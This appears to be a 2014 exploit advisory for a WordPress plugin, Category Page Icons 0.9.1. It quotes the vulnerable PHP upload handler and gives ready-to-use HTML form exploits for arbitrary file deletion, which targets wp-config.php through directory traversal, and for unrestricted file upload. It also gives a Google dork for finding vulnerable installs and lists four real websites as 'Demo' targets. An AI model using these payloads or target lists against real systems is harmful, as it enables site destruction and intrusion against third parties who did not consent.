
Exploit Author : NULL_Pointer

Date : 2014-09-29


Version : 0.9.1

Google Dork : inurl:/wp-content/plugins/category-page-icons/

--------------------------------------------------------------

1. Arbitrary File Deletion :

The vulnerable code is located in &#039;include/wpdev-flash-uploader.php&#039; :

171.    $action = $_POST[&#039;ajax_action&#039;];
172.    if ( isset($action) ) {
173.        switch ( $action ) :
174.            case &#039;delete-image&#039; :
175.                    $path = $_POST[&#039;file_name_dir&#039;] . &#039;/&#039; . $_POST[&#039;file_name_org&#039;];
176.                    $name_parts = pathinfo($path);
177.                    $ext = $name_parts[&#039;extension&#039;];
178.                    $file_name_only = trim( substr( $name_parts[&#039;basename&#039;], 0, -(1 + strlen($ext)) ) );
179.                    $path_icon = $_POST[&#039;file_name_dir&#039;] . &#039;/&#039; . $file_name_only . $_POST[&#039;fileicon_size&#039;]  ;
180.                    if (file_exists($path))  unlink( $path );

This issue allows an attacker to influence calls to the &#039;unlink()&#039; function and delete arbitrary files. Due to a lack of input validation, an attacker can supply directory traversal sequences followed by an arbitrary file name to delete specific files.

Exploit :

<html>
<form action="http://127.0.0.1/wp/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php" method="POST">
<input type="hidden" name="ajax_action" value="delete-image">
<input type="text" name="file_name_dir" value = "../../../../">
<input type="text" name="file_name_org" value = "wp-config.php">
<input type="submit" value="Delete it">
</form>
</html>

2. Unrestricted File Upload :

This application has an upload feature that allows any user to upload arbitrary files.

Allowed Extensions : txt, htm, html, jpg, png...etc

Exploit :

<html>
<form action="http://127.0.0.1/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php" method="POST" enctype="multipart/form-data">
Choose File to upload : <input type="file" name="wpdev-async-upload"><br />
Directory : <input type="text" name="dir_icons" value="../../../../"><br />
<input type="submit" value="Upload">
</form>
</html>

Demo :

http://www.astrolabo.com
http://www.hotelbas.pl
http://psoz.ru
http://www.7martgazetesi.net

